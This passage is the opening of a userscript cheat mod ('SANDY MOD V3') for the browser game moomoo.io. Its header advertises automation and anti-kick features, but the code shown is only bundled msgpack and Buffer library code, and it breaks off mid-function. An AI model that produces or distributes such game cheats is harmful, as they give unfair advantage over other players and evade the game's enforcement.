// ==UserScript==
// @name         SANDY MOD V3
// @version      3.0
// @description  OP PATH FINDER, ANTI INSTA, AUTO BREAK, ANTI KICK, ONE FRAME
// @match        *://*.moomoo.io/*
// @grant        none
// @author       HAXXER ON YT/POOP SACK
// @require      https://cdnjs.cloudflare.com/ajax/libs/jquery-confirm/3.3.0/jquery-confirm.min.js
// @require      https://cdn.jsdelivr.net/npm/msgpack-lite@0.1.26/dist/msgpack.min.js
// @namespace https://greasyfork.org/users/1147275
// @downloadURL https://update.greasyfork.org/scripts/473753/SANDY%20MOD%20V3.user.js
// @updateURL https://update.greasyfork.org/scripts/473753/SANDY%20MOD%20V3.meta.js
// ==/UserScript==
var tick = 0;
var needTick = 0;
var datas = [],
    timeStart = Date.now(),
    autoreload = false;

const nightTarget = [24, 47, 82, .3];
let nightMode = 1;
let Nights = 0;

! function(e) {
    var t = {};

    function n(i) {
        if (t[i]) return t[i].exports;
        var r = t[i] = {
            i: i,
            l: !1,
            exports: {}
        };
        return e[i].call(r.exports, r, r.exports, n), r.l = !0, r.exports
    }
    n.m = e, n.c = t, n.d = function(e, t, i) {
        n.o(e, t) || Object.defineProperty(e, t, {
            enumerable: !0,
            get: i
        })
    }, n.r = function(e) {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, n.t = function(e, t) {
        if (1 & t && (e = n(e)), 8 & t) return e;
        if (4 & t && "object" == typeof e && e && e.__esModule) return e;
        var i = Object.create(null);
        if (n.r(i), Object.defineProperty(i, "default", {
            enumerable: !0,
            value: e
        }), 2 & t && "string" != typeof e)
            for (var r in e) n.d(i, r, function(t) {
                return e[t]
            }.bind(null, r));
        return i
    }, n.n = function(e) {
        var t = e && e.__esModule ? function() {
            return e.default
        } : function() {
            return e
        };
        return n.d(t, "a", t), t
    }, n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "", n(n.s = 21)


}

([
    function(e, t, n) {
        var i = t.global = n(25),
            r = t.hasBuffer = i && !!i.isBuffer,
            s = t.hasArrayBuffer = "undefined" != typeof ArrayBuffer,
            a = t.isArray = n(5);
        t.isArrayBuffer = s ? function(e) {
            return e instanceof ArrayBuffer || p(e)
        } : m;
        var o = t.isBuffer = r ? i.isBuffer : m,
            c = t.isView = s ? ArrayBuffer.isView || y("ArrayBuffer", "buffer") : m;
        t.alloc = d, t.concat = function(e, n) {
            n || (n = 0, Array.prototype.forEach.call(e, (function(e) {
                n += e.length
            })));
            var i = this !== t && this || e[0],
                r = d.call(i, n),
                s = 0;
            return Array.prototype.forEach.call(e, (function(e) {
                s += f.copy.call(e, r, s)
            })), r
        }, t.from = function(e) {
            return "string" == typeof e ? function(e) {
                var t = 3 * e.length,
                    n = d.call(this, t),
                    i = f.write.call(n, e);
                return t !== i && (n = f.slice.call(n, 0, i)), n
            }.call(this, e) : g(this).from(e)
        };
        var l = t.Array = n(28),
            h = t.Buffer = n(29),
            u = t.Uint8Array = n(30),
            f = t.prototype = n(6);

        function d(e) {
            return g(this).alloc(e)
        }
        var p = y("ArrayBuffer");

        function g(e) {
            return o(e) ? h : c(e) ? u : a(e) ? l : r ? h : s ? u : l
        }

        function m() {
            return !1
        }

        function y(e, t) {
            return e = "[object " + e + "]",
                function(n) {
                return null != n && {}.toString.call(t ? n[t] : n) === e
            }
        }
    }, function(e, t, n) {
        var i = n(5);
        t.createCodec = o, t.install = function(e) {
            for (var t in e) s.prototype[t] = a(s.prototype[t], e[t])
        }, t.filter = function(e) {
            return i(e) ? function(e) {
                return e = e.slice(),
                    function(n) {
                    return e.reduce(t, n)
                };

                function t(e, t) {
                    return t(e)
                }
            }(e) : e
        };
        var r = n(0);

        function s(e) {
            if (!(this instanceof s)) return new s(e);
            this.options = e, this.init()
        }

        function a(e, t) {
            return e && t ? function() {
                return e.apply(this, arguments), t.apply(this, arguments)
            } : e || t
        }

        function o(e) {
            return new s(e)
        }
        s.prototype.init = function() {
            var e = this.options;
            return e && e.uint8array && (this.bufferish = r.Uint8Array), this
        }, t.preset = o({
            preset: !0
        })
    }, function(e, t, n) {
        var i = n(3).ExtBuffer,
            r = n(32),
            s = n(33),
            a = n(1);

        function o() {
            var e = this.options;
            return this.encode = function(e) {
                var t = s.getWriteType(e);
                return function(e, n) {
                    var i = t[typeof n];
                    if (!i) throw new Error('Unsupported type "' + typeof n + '": ' + n);
                    i(e, n)
                }
            }(e), e && e.preset && r.setExtPackers(this), this
        }
        a.install({
            addExtPacker: function(e, t, n) {
                n = a.filter(n);
                var r = t.name;
                r && "Object" !== r ? (this.extPackers || (this.extPackers = {}))[r] = s : (this.extEncoderList || (this.extEncoderList = [])).unshift([t, s]);

                function s(t) {
                    return n && (t = n(t)), new i(t, e)
                }
            },
            getExtPacker: function(e) {
                var t = this.extPackers || (this.extPackers = {}),
                    n = e.constructor,
                    i = n && n.name && t[n.name];
                if (i) return i;
                for (var r = this.extEncoderList || (this.extEncoderList = []), s = r.length, a = 0; a < s; a++) {
                    var o = r[a];
                    if (n === o[0]) return o[1]
                }
            },
            init: o
        }), t.preset = o.call(a.preset)
    }, function(e, t, n) {
        t.ExtBuffer = function e(t, n) {
            if (!(this instanceof e)) return new e(t, n);
            this.buffer = i.from(t), this.type = n
        };
        var i = n(0)
        }, function(e, t) {
            t.read = function(e, t, n, i, r) {
                var s, a, o = 8 * r - i - 1,
                    c = (1 << o) - 1,
                    l = c >> 1,
                    h = -7,
                    u = n ? r - 1 : 0,
                    f = n ? -1 : 1,
                    d = e[t + u];
                for (u += f, s = d & (1 << -h) - 1, d >>= -h, h += o; h > 0; s = 256 * s + e[t + u], u += f, h -= 8);
                for (a = s & (1 << -h) - 1, s >>= -h, h += i; h > 0; a = 256 * a + e[t + u], u += f, h -= 8);
                if (0 === s) s = 1 - l;
                else {
                    if (s === c) return a ? NaN : 1 / 0 * (d ? -1 : 1);
                    a += Math.pow(2, i), s -= l
                }
                return (d ? -1 : 1) * a * Math.pow(2, s - i)
            }, t.write = function(e, t, n, i, r, s) {
                var a, o, c, l = 8 * s - r - 1,
                    h = (1 << l) - 1,
                    u = h >> 1,
                    f = 23 === r ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
                    d = i ? 0 : s - 1,
                    p = i ? 1 : -1,
                    g = t < 0 || 0 === t && 1 / t < 0 ? 1 : 0;
                for (t = Math.abs(t), isNaN(t) || t === 1 / 0 ? (o = isNaN(t) ? 1 : 0, a = h) : (a = Math.floor(Math.log(t) / Math.LN2), t * (c = Math.pow(2, -a)) < 1 && (a--, c *= 2), (t += a + u >= 1 ? f / c : f * Math.pow(2, 1 - u)) * c >= 2 && (a++, c /= 2), a + u >= h ? (o = 0, a = h) : a + u >= 1 ? (o = (t * c - 1) * Math.pow(2, r), a += u) : (o = t * Math.pow(2, u - 1) * Math.pow(2, r), a = 0)); r >= 8; e[n + d] = 255 & o, d += p, o /= 256, r -= 8);
                for (a = a << r | o, l += r; l > 0; e[n + d] = 255 & a, d += p, a /= 256, l -= 8);
                e[n + d - p] |= 128 * g
            }
        }, function(e, t) {
            var n = {}.toString;
            e.exports = Array.isArray || function(e) {
                return "[object Array]" == n.call(e)
            }
        }, function(e, t, n) {
            var i = n(31);
            t.copy = c, t.slice = l, t.toString = function(e, t, n) {
                return (!a && r.isBuffer(this) ? this.toString : i.toString).apply(this, arguments)
            }, t.write = function(e) {
                return function() {
                    return (this[e] || i[e]).apply(this, arguments)
                }
            }("write");
            var r = n(0),
                s = r.global,
                a = r.hasBuffer && "TYPED_ARRAY_SUPPORT" in s,
                o = a && !s.TYPED_ARRAY_SUPPORT;

            function c(e, t, n, s) {
                var a = r.isBuffer(this),
                    c = r.isBuffer(e);
                if (a && c) return this.copy(e, t, n, s);
                if (o || a || c || !r.isView(this) || !r.isView(e)) return i.copy.call(this, e, t, n, s);
                var h = n || null != s ? l.call(this, n, s) : this;
                return e.set(h, t), h.length
            }

            function l(e, t) {
                var n = this.slice || !o && this.subarray;
                if (n) return n.call(this, e, t);
                var i = r.alloc.call(this, t - e);
                return c.call(this, i, 0, e, t), i
            }
        }, function(e, t, n) {
            (function(e) {
                ! function(t) {
                    var n, i = "undefined",
                        r = i !== typeof e && e,
                        s = i !== typeof Uint8Array && Uint8Array,
                        a = i !== typeof ArrayBuffer && ArrayBuffer,
                        o = [0, 0, 0, 0, 0, 0, 0, 0],
                        c = Array.isArray || function(e) {
                            return !!e && "[object Array]" == Object.prototype.toString.call(e)
                        },
                        l = 4294967296;

                    function h(e, c, h) {
                        var b = c ? 0 : 4,
                            x = c ? 4 : 0,
                            S = c ? 0 : 3,
                            T = c ? 1 : 2,
                            I = c ? 2 : 1,
                            E = c ? 3 : 0,
                            M = c ? y : v,
                            A = c ? k : w,
                            P = O.prototype,
                            B = "is" + e,
                            C = "_" + B;
                        return P.buffer = void 0, P.offset = 0, P[C] = !0, P.toNumber = R, P.toString = function(e) {
                            var t = this.buffer,
                                n = this.offset,
                                i = _(t, n + b),
                                r = _(t, n + x),
                                s = "",
                                a = !h && 2147483648 & i;
                            for (a && (i = ~i, r = l - r), e = e || 10;;) {
                                var o = i % e * l + r;
                                if (i = Math.floor(i / e), r = Math.floor(o / e), s = (o % e).toString(e) + s, !i && !r) break
                            }
                            return a && (s = "-" + s), s
                        }, P.toJSON = R, P.toArray = u, r && (P.toBuffer = f), s && (P.toArrayBuffer = d), O[B] = function(e) {
                            return !(!e || !e[C])
                        }, t[e] = O, O;

                        function O(e, t, r, c) {
                            return this instanceof O ? function(e, t, r, c, h) {
                                if (s && a && (t instanceof a && (t = new s(t)), c instanceof a && (c = new s(c))), t || r || c || n) {
                                    if (!p(t, r)) h = r, c = t, r = 0, t = new(n || Array)(8);
                                    e.buffer = t, e.offset = r |= 0, i !== typeof c && ("string" == typeof c ? function(e, t, n, i) {
                                        var r = 0,
                                            s = n.length,
                                            a = 0,
                                            o = 0;
                                        "-" === n[0] && r++;
                                        for (var c = r; r < s;) {
                                            var h = parseInt(n[r++], i);
                                            if (!(h >= 0)) break;
                                            o = o * i + h, a = a * i + Math.floor(o / l), o %= l
                                        }
                                        c && (a = ~a, o ? o = l - o : a++), j(e, t + b, a), j(e, t + x, o)
                                    }(t, r, c, h || 10) : p(c, h) ? g(t, r, c, h) : "number" == typeof h ? (j(t, r + b, c), j(t, r + x, h)) : c > 0 ? M(t, r, c) : c < 0 ? A(t, r, c) : g(t, r, o, 0))
                                } else e.buffer = m(o, 0)
                            }(this, e, t, r, c) : new O(e, t, r, c)
                        }

                        function R() {
                            var e = this.buffer,
                                t = this.offset,
                                n = _(e, t + b),
                                i = _(e, t + x);
                            return h || (n |= 0), n ? n * l + i : i
                        }

                        function j(e, t, n) {
                            e[t + E] = 255 & n, n >>= 8, e[t + I] = 255 & n, n >>= 8, e[t + T] = 255 & n, n >>= 8, e[t + S] = 255 & n
                        }

                        function _(e, t) {
                            return 16777216 * e[t + S] + (e[t + T] << 16) + (e[t + I] << 8) + e[t + E]
                        }
                    }

                    function u(e) {
                        var t = this.buffer,
                            i = this.offset;
                        return n = null, !1 !== e && 0 === i && 8 === t.length && c(t) ? t : m(t, i)
                    }

                    function f(t) {
                        var i = this.buffer,
                            s = this.offset;
                        if (n = r, !1 !== t && 0 === s && 8 === i.length && e.isBuffer(i)) return i;
                        var a = new r(8);
                        return g(a, 0, i, s), a
                    }

                    function d(e) {
                        var t = this.buffer,
                            i = this.offset,
                            r = t.buffer;
                        if (n = s, !1 !== e && 0 === i && r instanceof a && 8 === r.byteLength) return r;
                        var o = new s(8);
                        return g(o, 0, t, i), o.buffer
                    }

                    function p(e, t) {
                        var n = e && e.length;
                        return t |= 0, n && t + 8 <= n && "string" != typeof e[t]
                    }

                    function g(e, t, n, i) {
                        t |= 0, i |= 0;
                        for (var r = 0; r < 8; r++) e[t++] = 255 & n[i++]
                    }

                    function m(e, t) {
                        return Array.prototype.slice.call(e, t, t + 8)
                    }

                    function y(e, t, n) {
                        for (var i = t + 8; i > t;) e[--i] = 255 & n, n /= 256
                    }

                    function k(e, t, n) {
                        var i = t + 8;
                        for (n++; i > t;) e[--i] = 255 & -n ^ 255, n /= 256
                    }

                    function v(e, t, n) {
                        for (var i = t + 8; t < i;) e[t++] = 255 & n, n /= 256
                    }

                    function w(e, t, n) {
                        var i = t + 8;
                        for (n++; t < i;) e[t++] = 255 & -n ^ 255, n /= 256
                    }
                    h("Uint64BE", !0, !0), h("Int64BE", !0, !1), h("Uint64LE", !1, !0), h("Int64LE", !1, !1)
                }("string" != typeof t.nodeName ? t : this || {})
            }).call(this, n(11).Buffer)
        }, function(e, t, n) {
            var i = n(3).ExtBuffer,
                r = n(35),
                s = n(17).readUint8,
                a = n(36),
                o = n(1);

            function c() {
                var e = this.options;
                return this.decode = function(e) {
                    var t = a.getReadToken(e);
                    return function(e) {
                        var n = s(e),
                            i = t[n];
                        if (!i) throw new Error("Invalid type: " + (n ? "0x" + n.toString(16) : n));
                        return i(e)
                    }
                }(e), e && e.preset && r.setExtUnpackers(this), this
            }
            o.install({
                addExtUnpacker: function(e, t) {
                    (this.extUnpackers || (this.extUnpackers = []))[e] = o.filter(t)
                },
                getExtUnpacker: function(e) {
                    return (this.extUnpackers || (this.extUnpackers = []))[e] || function(t) {
                        return new i(t, e)
                    }
                },
                init: c
            }), t.preset = c.call(o.preset)
        }, function(e, t, n) {
            t.encode = function(e, t) {
                var n = new i(t);
                return n.write(e), n.read()
            };
            var i = n(10).EncodeBuffer
            }, function(e, t, n) {
                t.EncodeBuffer = r;
                var i = n(2).preset;

                function r(e) {
                    if (!(this instanceof r)) return new r(e);
                    if (e && (this.options = e, e.codec)) {
                        var t = this.codec = e.codec;
                        t.bufferish && (this.bufferish = t.bufferish)
                    }
                }
                n(14).FlexEncoder.mixin(r.prototype), r.prototype.codec = i, r.prototype.write = function(e) {
                    this.codec.encode(this, e)
                }
            }, function(e, t, n) {
                "use strict";
                (function(e) {
                    /*!
		 * The buffer module from node.js, for the browser.
		 *
		 * @author   Feross Aboukhadijeh <http://feross.org>
		 * @license  MIT
		 */
                    var i = n(26),
                        r = n(4),
                        s = n(27);

                    function a() {
                        return c.TYPED_ARRAY_SUPPORT ? 2147483647 : 1073741823
                    }

                    function o(e, t) {
                        if (a() < t) throw new RangeError("Invalid typed array length");
                        return c.TYPED_ARRAY_SUPPORT ? (e = new Uint8Array(t)).__proto__ = c.prototype : (null === e && (e = new c(t)), e.length = t), e
                    }

                    function c(e, t, n) {
                        if (!(c.TYPED_ARRAY_SUPPORT || this instanceof c)) return new c(e, t, n);
                        if ("number" == typeof e) {
                            if ("string" == typeof t) throw new Error("If encoding is specified then the first argument must be a string");
                            return u(this, e)
                        }
                        return l(this, e, t, n)
                    }

                    function l(e, t, n, i) {
                        if ("number" == typeof t) throw new TypeError('"value" argument must not be a number');
                        return "undefined" != typeof ArrayBuffer && t instanceof ArrayBuffer ? function(e, t, n, i) {
                            if (t.byteLength, n < 0 || t.byteLength < n) throw new RangeError("'offset' is out of bounds");
                            if (t.byteLength < n + (i || 0)) throw new RangeError("'length' is out of bounds");
                            return t = void 0 === n && void 0 === i ? new Uint8Array(t) : void 0 === i ? new Uint8Array(t, n) : new Uint8Array(t, n, i), c.TYPED_ARRAY_SUPPORT ? (e = t).__proto__ = c.prototype : e = f(e, t), e
                        }(e, t, n, i) : "string" == typeof t ? function(e, t, n) {
                            if ("string" == typeof n && "" !== n || (n = "utf8"), !c.isEncoding(n)) throw new TypeError('"encoding" must be a valid string encoding');
                            var i = 0 | p(t, n),
                                r = (e = o(e, i)).write(t, n);
                            return r !== i && (e = e.slice(0, r)), e
                        }(e, t, n) : function(e, t) {
                            if (c.isBuffer(t)) {
                                var n = 0 | d(t.length);
                                return 0 === (e = o(e, n)).length || t.copy(e, 0, 0, n), e
                            }
                            if (t) {
                                if ("undefined" != typeof ArrayBuffer && t.buffer instanceof ArrayBuffer || "length" in t) return "number" != typeof t.length || function(e) {
                                    return e != e
                                }(t.length) ? o(e, 0) : f(e, t);
                                if ("Buffer" === t.type && s(t.data)) return f(e, t.data)
                            }
                            throw new TypeError("First argument must be a string, Buffer, ArrayBuffer, Array, or array-like object.")
                        }(e, t)
                    }

                    function h(e) {
                        if ("number" != typeof e) throw new TypeError('"size" argument must be a number');
                        if (e < 0) throw new RangeError('"size" argument must not be negative')
                    }

                    function u(e, t) {
                        if (h(t), e = o(e, t < 0 ? 0 : 0 | d(t)), !c.TYPED_ARRAY_SUPPORT)
                            for (var n = 0; n < t; ++n) e[n] = 0;
                        return e
                    }

                    function f(e, t) {
                        var n = t.length < 0 ? 0 : 0 | d(t.length);
                        e = o(e, n);
                        for (var i = 0; i < n; i += 1) e[i] = 255 & t[i];
                        return e
                    }

                    function d(e) {
                        if (e >= a()) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + a().toString(16) + " bytes");
                        return 0 | e
                    }

                    function p(e, t) {
                        if (c.isBuffer(e)) return e.length;
                        if ("undefined" != typeof ArrayBuffer && "function" == typeof ArrayBuffer.isView && (ArrayBuffer.isView(e) || e instanceof ArrayBuffer)) return e.byteLength;
                        "string" != typeof e && (e = "" + e);
                        var n = e.length;
                        if (0 === n) return 0;
                        for (var i = !1;;) switch (t) {
                            case "ascii":
                            case "latin1":
                            case "binary":
                                return n;
                            case "utf8":
                            case "utf-8":
                            case void 0:
                                return z(e).length;
                            case "ucs2":
                            case "ucs-2":
                            case "utf16le":
                            case "utf-16le":
                                return 2 * n;
                            case "hex":
                                return n >>> 1;
                            case "base64":
                                return H(e).length;
                            default:
                                if (i) return z(e).length;
                                t = ("" + t).toLowerCase(), i = !0
                        }
                    }

                    function g(e, t, n) {
                        var i = e[t];
                        e[t] = e[n], e[n] = i
                    }

                    function m(e, t, n, i, r) {
                        if (0 === e.length) return -1;
                        if ("string" == typeof n ? (i = n, n = 0) : n > 2147483647 ? n = 2147483647 : n < -2147483648 && (n = -2147483648), n = +n, isNaN(n) && (n = r ? 0 : e.length - 1), n < 0 && (n = e.length + n), n >= e.length) {
                            if (r) return -1;
                            n = e.length - 1
                        } else if (n < 0) {
                            if (!r) return -1;
                            n = 0
                        }
                        if ("string" == typeof t && (t = c.from(t, i)), c.isBuffer(t)) return 0 === t.length ? -1 : y(e, t, n, i, r);
                        if ("number" == typeof t) return t &= 255, c.TYPED_ARRAY_SUPPORT && "function" == typeof Uint8Array.prototype.indexOf ? r ? Uint8Array.prototype.indexOf.call(e, t, n) : Uint8Array.prototype.lastIndexOf.call(e, t, n) : y(e, [t], n, i, r);
                        throw new TypeError("val must be string, number or Buffer")
                    }

                    function y(e, t, n, i, r) {
                        var s, a = 1,
                            o = e.length,
                            c = t.length;
                        if (void 0 !== i && ("ucs2" === (i = String(i).toLowerCase()) || "ucs-2" === i || "utf16le" === i || "utf-16le" === i)) {
                            if (e.length < 2 || t.length < 2) return -1;
                            a = 2, o /= 2, c /= 2, n /= 2
                        }

                        function l(e, t) {
                            return 1 === a ? e[t] : e.readUInt16BE(t * a)
                        }
                        if (r) {
                            var h = -1;
                            for (s = n; s < o; s++)
                                if (l(e, s) === l(t, -1 === h ? 0 : s - h)) {
                                    if (-1 === h && (h = s), s - h + 1 === c) return h * a
                                } else -1 !== h && (s -= s - h), h = -1
                        } else
                            for (n + c > o && (n = o - c), s = n; s >= 0; s--) {
                                for (var u = !0, f = 0; f < c; f++)
                                    if (l(e, s + f) !== l(t, f)) {
                                        u = !1;
                                        break
                                    } if (u) return s
                            }
                        return -1
                    }

                    function k(e, t, n, i) {
                        n = Number(n) || 0;
                        var r = e.length - n;
                        i ? (i = Number(i)) > r && (i = r) : i = r;
                        var s = t.length;
                        if (s % 2 != 0) throw new TypeError("Invalid hex string");
                        i > s / 2 && (i = s / 2);
                        for (var a = 0; a < i; ++a) {
                            var o = parseInt(t.substr(2 * a, 2), 16);
                            if (isNaN(o)) return a;
                            e[n + a] = o
                        }
                        return a
                    }

                    function v(e, t, n, i) {
                        return V(z(t, e.length - n), e, n, i)
                    }

                    function w(e, t, n, i) {
                        return V(function(e) {
                            for (var t = [], n = 0; n < e.length; ++n) t.push(255 & e.charCodeAt(n));
                            return t
                        }(t), e, n, i)
                    }

                    function b(e, t, n, i) {
                        return w(e, t, n, i)
                    }

                    function x(e, t, n, i) {
                        return V(H(t), e, n, i)
                    }

                    function S(e, t, n, i) {
                        return V(function(e, t) {
                            for (var n, i, r, s = [], a = 0; a < e.length && !((t -= 2) < 0); ++a) i = (n = e.charCodeAt(a)) >> 8, r = n % 256, s.push(r), s.push(i);
                            return s
                        }(t, e.length - n), e, n, i)
                    }

                    function T(e, t, n) {
                        return 0 === t && n === e.length ? i.fromByteArray(e) : i.fromByteArray(e.slice(t, n))
                    }

                    function I(e, t, n) {
                        n = Math.min(e.length, n);
                        for (var i = [], r = t; r < n;) {
                            var s, a, o, c, l = e[r],
                                h = null,
                                u = l > 239 ? 4 : l > 223 ? 3 : l > 191 ? 2 : 1;
                            if (r + u <= n) switch (u) {
                                case 1:
                                    l < 128 && (h = l);
                                    break;
                                case 2:
                                    128 == (192 & (s = e[r + 1])) && (c = (31 & l) << 6 | 63 & s) > 127 && (h = c);
                                    break;
                                case 3:
                                    s = e[r + 1], a = e[r + 2], 128 == (192 & s) && 128 == (192 & a) && (c = (15 & l) << 12 | (63 & s) << 6 | 63 & a) > 2047 && (c < 55296 || c > 57343) && (h = c);
                                    break;
                                case 4:
                                    s = e[r + 1], a = e[r + 2], o = e[r + 3], 128 == (192 & s) && 128 == (192 & a) && 128 == (192 & o) && (c = (15 & l) << 18 | (63 & s) << 12 | (63 & a) << 6 | 63 & o) > 65535 && c < 1114112 && (h = c)
                            }
                            null === h ? (h = 65533, u = 1) : h > 65535 && (h -= 65536, i.push(h >>> 10 & 1023 | 55296), h = 56320 | 1023 & h), i.push(h), r += u
                        }
                        return function(e) {
                            var t = e.length;
                            if (t <= E) return String.fromCharCode.apply(String, e);
                            for (var n = "", i = 0; i < t;) n += String.fromCharCode.apply(String, e.slice(i, i += E));
                            return n
                        }(i)
                    }
                    t.Buffer = c, t.SlowBuffer = function(e) {
                        return +e != e && (e = 0), c.alloc(+e)
                    }, t.INSPECT_MAX_BYTES = 50, c.TYPED_ARRAY_SUPPORT = void 0 !== e.TYPED_ARRAY_SUPPORT ? e.TYPED_ARRAY_SUPPORT : function() {
                        try {
                            var e = new Uint8Array(1);
                            return e.__proto__ = {
                                __proto__: Uint8Array.prototype,
                                foo: function() {
                                    return 42
                                }
                            }, 42 === e.foo() && "function" == typeof e.subarray && 0 === e.subarray(1, 1).byteLength
                        } catch (e) {
                            return !1
                        }
                    }(), t.kMaxLength = a(), c.poolSize = 8192, c._augment = function(e) {
                        return e.__proto__ = c.prototype, e
                    }, c.from = function(e, t, n) {
                        return l(null, e, t, n)
                    }, c.TYPED_ARRAY_SUPPORT && (c.prototype.__proto__ = Uint8Array.prototype, c.__proto__ = Uint8Array, "undefined" != typeof Symbol && Symbol.species && c[Symbol.species] === c && Object.defineProperty(c, Symbol.species, {
                        value: null,
                        configurable: !0
                    })), c.alloc = function(e, t, n) {
                        return function(e, t, n, i) {
                            return h(t), t <= 0 ? o(e, t) : void 0 !== n ? "string" == typeof i ? o(e, t).fill(n, i) : o(e, t).fill(n) : o(e, t)
                        }(null, e, t, n)
                    }, c.allocUnsafe = function(e) {
                        return u(null, e)
                    }, c.allocUnsafeSlow = function(e) {
                        return u(null, e)
                    }, c.isBuffer = function(e) {
                        return !(null == e || !e._isBuffer)
                    }, c.compare = function(e, t) {
                        if (!c.isBuffer(e) || !c.isBuffer(t)) throw new TypeError("Arguments must be Buffers");
                        if (e === t) return 0;
                        for (var n = e.length, i = t.length, r = 0, s = Math.min(n, i); r < s; ++r)
                            if (e[r] !== t[r]) {
                                n = e[r], i = t[r];
                                break
                            } return n < i ? -1 : i < n ? 1 : 0
                    }, c.isEncoding = function(e) {
                        switch (String(e).toLowerCase()) {
                            case "hex":
                            case "utf8":
                            case "utf-8":
                            case "ascii":
                            case "latin1":
                            case "binary":
                            case "base64":
                            case "ucs2":
                            case "ucs-2":
                            case "utf16le":
                            case "utf-16le":
                                return !0;
                            default:
                                return !1
                        }
                    }, c.concat = function(e, t) {
                        if (!s(e)) throw new TypeError('"list" argument must be an Array of Buffers');
                        if (0 === e.length) return c.alloc(0);
                        var n;
                        if (void 0 === t)
                            for (t = 0, n = 0; n < e.length; ++n) t += e[n].length;
                        var i = c.allocUnsafe(t),
                            r = 0;
                        for (n = 0; n < e.length; ++n) {
                            var a = e[n];
                            if (!c.isBuffer(a)) throw new TypeError('"list" argument must be an Array of Buffers');
                            a.copy(i, r), r += a.length
                        }
                        return i
                    }, c.byteLength = p, c.prototype._isBuffer = !0, c.prototype.swap16 = function() {
                        var e = this.length;
                        if (e % 2 != 0) throw new RangeError("Buffer size must be a multiple of 16-bits");
                        for (var t = 0; t < e; t += 2) g(this, t, t + 1);
                        return this
                    }, c.prototype.swap32 = function() {
                        var e = this.length;
                        if (e % 4 != 0) throw new RangeError("Buffer size must be a multiple of 32-bits");
                        for (var t = 0; t < e; t += 4) g(this, t, t + 3), g(this, t + 1, t + 2);
                        return this
                    }, c.prototype.swap64 = function() {
                        var e = this.length;
                        if (e % 8 != 0) throw new RangeError("Buffer size must be a multiple of 64-bits");
                        for (var t = 0; t < e; t += 8) g(this, t, t + 7), g(this, t + 1, t + 6), g(this, t + 2, t + 5), g(this, t + 3, t + 4);
                        return this
                    }, c.prototype.toString = function() {
                        var e = 0 | this.length;
                        return 0 === e ? "" : 0 === arguments.length ? I(this, 0, e) : function(e, t, n) {
                            var i = !1;
                            if ((void 0 === t || t < 0) && (t = 0), t > this.length) return "";
                            if ((void 0 === n || n > this.length) && (n = this.length), n <= 0) return "";
                            if ((n >>>= 0) <= (t >>>= 0)) return "";
                            for (e || (e = "utf8");;) switch (e) {
                                case "hex":
                                    return P(this, t, n);
                                case "utf8":
                                case "utf-8":
                                    return I(this, t, n);
                                case "ascii":
                                    return M(this, t, n);
                                case "latin1":
                                case "binary":
                                    return A(this, t, n);
                                case "base64":
                                    return T(this, t, n);
                                case "ucs2":
                                case "ucs-2":
                                case "utf16le":
                                case "utf-16le":
                                    return B(this, t, n);
                                default:
                                    if (i) throw new TypeError("Unknown encoding: " + e);
                                    e = (e + "").toLowerCase(), i = !0
                            }
                        }.apply(this, arguments)
                    }, c.prototype.equals = function(e) {
                        if (!c.isBuffer(e)) throw new TypeError("Argument must be a Buffer");
                        return this === e || 0 === c.compare(this, e)
                    }, c.prototype.inspect = function() {
                        var e = "",
                            n = t.INSPECT_MAX_BYTES;
                        return this.length > 0 && (e = this.toString("hex", 0, n).match(/.{2}/g).join(" "), this.length > n && (e += " ... ")), "<Buffer " + e + ">"
                    }, c.prototype.compare = function(e, t, n, i, r) {
                        if (!c.isBuffer(e)) throw new TypeError("Argument must be a Buffer");
                        if (void 0 === t && (t = 0), void 0 === n && (n = e ? e.length : 0), void 0 === i && (i = 0), void 0 === r && (r = this.length), t < 0 || n > e.length || i < 0 || r > this.length) throw new RangeError("out of range index");
                        if (i >= r && t >= n) return 0;
                        if (i >= r) return -1;
                        if (t >= n) return 1;
                        if (this === e) return 0;
                        for (var s = (r >>>= 0) - (i >>>= 0), a = (n >>>= 0) - (t >>>= 0), o = Math.min(s, a), l = this.slice(i, r), h = e.slice(t, n), u = 0; u < o; ++u)
                            if (l[u] !== h[u]) {
                                s = l[u], a = h[u];
                                break
                            } return s < a ? -1 : a < s ? 1 : 0
                    }, c.prototype.includes = function(e, t, n) {
                        return -1 !== this.indexOf(e, t, n)
                    }, c.prototype.indexOf = function(e, t, n) {
                        return m(this, e, t, n, !0)
                    }, c.prototype.lastIndexOf = function(e, t, n) {
                        return m(this, e, t, n, !1)
                    }, c.prototype.write = function(e, t, n, i) {
                        if (void 0 === t) i = "utf8", n = this.length, t = 0;
                        else if (void 0 === n && "string" == typeof t) i = t, n = this.length, t = 0;
                        else {
                            if (!isFinite(t)) throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                            t |= 0, isFinite(n) ? (n |= 0, void 0 === i && (i = "utf8")) : (i = n, n = void 0)
                        }
                        var r = this.length - t;
                        if ((void 0 === n || n > r) && (n = r), e.length > 0 && (n < 0 || t < 0) || t > this.length) throw new RangeError("Attempt to write outside buffer bounds");
                        i || (i = "utf8");
                        for (var s = !1;;) switch (i) {
                            case "hex":
                                return k(this, e, t, n);
                            case "utf8":
                            case "utf-8":
                                return v(this, e, t, n);
                            case "ascii":
                                return w(this, e, t, n);
                            case "latin1":
                            case "binary":
                                return b(this, e, t, n);
                            case "base64":
                                return x(this, e, t, n);
                            case "ucs2":
                            case "ucs-2":
                            case "utf16le":
                            case "utf-16le":
                                return S(this, e, t, n);
                            default:
                                if (s) throw new TypeError("Unknown encoding: " + i);
                                i = ("" + i).toLowerCase(), s = !0
                        }
                    }, c.prototype.toJSON = function() {
                        return {
                            type: "Buffer",
                            data: Array.prototype.slice.call(this._arr || this, 0)
                        }
                    };
                    var E = 4096;

                    function M(e, t, n) {
                        var i = "";
                        n = Math.min(e.length, n);
                        for (var r = t; r < n; ++r) i += String.fromCharCode(127 & e[r]);
                        return i
                    }

                    function A(e, t, n) {
                        var i = "";
                        n = Math.min(e.length, n);
                        for (var r = t; r < n; ++r) i += String.fromCharCode(e[r]);
                        return i
                    }

                    function P(e, t, n) {
                        var i = e.length;
                        (!t || t < 0) && (t = 0), (!n || n < 0 || n > i) && (n = i);
                        for (var r = "", s = t; s < n; ++s) r += F(e[s]);
                        return r
                    }

                    function B(e, t, n) {
